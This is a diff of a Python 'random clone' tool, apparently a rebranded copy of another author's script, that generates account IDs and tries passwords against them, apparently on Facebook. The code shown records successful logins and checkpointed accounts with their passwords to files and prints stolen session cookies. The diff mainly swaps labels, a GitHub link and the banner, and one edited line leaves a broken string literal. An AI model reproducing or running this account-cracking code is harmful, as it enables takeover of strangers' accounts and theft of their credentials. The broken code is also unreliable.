@@ -30,12 +30,7 @@ B = '\x1b[1;94m'
 U = '\x1b[1;95m' 
 O = '\x1b[1;96m' 
 N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BN = '\x1b[1;107m' 
-BBL = '\x1b[1;106m' 
-BP = '\x1b[1;105m' 
-BB = '\x1b[1;104m' 
-BK = '\x1b[1;103m' 
+A = '\x1b[1; 
 BH = '\x1b[1;102m' 
 BM = '\x1b[1;101m' 
 BA = '\x1b[1;100m' 
@@ -69,13 +64,13 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
-os.system('xdg-open https://github.com/MohammedFarouq/cloning-.git')
+os.system('xdg-open https://github.com/MUMIT-404-CYBER')
 logo = ("""
 \033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / _ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / /   _/ /  |//   
-\033[1;94m _/ // /|/ / / / /______/ /|  / / /    
-\033[1;95m/___/_/ |_/_/_/\____/_______/ |_/ /_/     \033[1;92m
+\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
+\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
+\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
+\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
  ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mHACKCODEß           ┃
  ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
@@ -151,7 +146,7 @@ def gml():
     kodex = input(' [?] Target last name :  ')
     os.system('clear')
     print(logo)
-    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print(' [+] EXAMPLE : @gmail.com, @yahoo.com, @ping.com, @Bing.com ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     doamin = input(' [?] Terget doamin : ')
     os.system('clear')
@@ -222,7 +217,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[INNOCENT-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[Enjoy-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -230,14 +225,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[INNOCENT-CP] {cid}|{ps}")
+                print(f"\x1b[38;5;196m[Rubbish-CP] {cid}|{ps}")
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[INNOCENT] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[Bomb] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
